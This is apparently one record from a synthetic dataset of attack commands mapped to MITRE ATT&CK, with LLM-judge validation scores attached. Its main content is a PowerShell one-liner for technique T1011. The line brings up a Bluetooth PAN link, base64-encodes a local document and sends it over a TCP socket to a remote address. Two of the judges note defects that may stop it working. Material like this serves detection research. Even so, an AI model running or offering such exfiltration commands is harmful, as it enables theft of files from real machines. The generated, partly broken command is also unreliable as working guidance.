{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.224.17.2 255.255.255.252 | Out-Null; $q=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\q3-report.docx')); $t=New-Object Net.Sockets.TcpClient; $t.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.224.17.2'),0)); $t.Connect('10.224.17.1',53337); $st=$t.GetStream(); $req=[Text.Encoding]::UTF8.GetBytes(('GET /u?d='+[Uri]::EscapeDataString($q)+' HTTP/1.1`r`nHost: x`r`nConnection: close`r`n`r`n')); $st.Write($req,0,$req.Length); $st.Close(); $t.Close()",
  "explanation": "Sends a stealthy HTTP-like GET with base64 in the query over a high TCP port bound to the Bluetooth interface, using Bluetooth as the exfil medium (T1011).",
  "rationale_steps": [
    "Use BluetoothCL to connect to a NAP service (alternate medium).",
    "Apply a static IP to the Bluetooth adapter using netsh.",
    "Bind TCP client to the Bluetooth IP to force Bluetooth egress.",
    "Emit base64 within an HTTP-style request over a nonstandard port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-ed016aed",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes/parentheses, valid separators, and parseable .NET and external command invocations.",
        "semantic_score": 2,
        "semantic_justification": "While conceptually aligned with Bluetooth/PAN exfiltration, it likely fails operationally due to using an improbable BluetoothCL.exe /connect NAP capability, requiring admin rights for netsh IP configuration despite 'Privilege: None', and constructing an HTTP request with literal `r`/`n in single-quoted strings (not CRLF), making successful exfiltration unlikely.",
        "combined_score": 3.5,
        "confidence": 0.66,
        "timestamp": "2025-09-30T23:43:52.058063Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax, and appropriate escape sequences.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements T1011 by establishing a Bluetooth PAN connection, configuring the interface with a static IP, base64-encoding a document, and exfiltrating it over the Bluetooth network medium using a TCP connection on a non-standard port.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-09-30T23:43:54.950190Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 3,
        "syntactic_justification": "The HTTP request string uses single quotes around PowerShell escape sequences (`r`n), which will prevent their interpretation, leading to literal backticks being sent and a malformed HTTP request.",
        "semantic_score": 2,
        "semantic_justification": "The `netsh interface ip set address` command typically requires administrator privileges on Windows, directly contradicting the stated 'Privilege: None' and making the operation largely infeasible as described.",
        "combined_score": 2.5,
        "confidence": 0.9,
        "timestamp": "2025-09-30T23:44:19.473071Z"
      }
    ],
    "llm_average_syntactic": 4.333,
    "llm_average_semantic": 3.0,
    "llm_average_score": 3.667,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}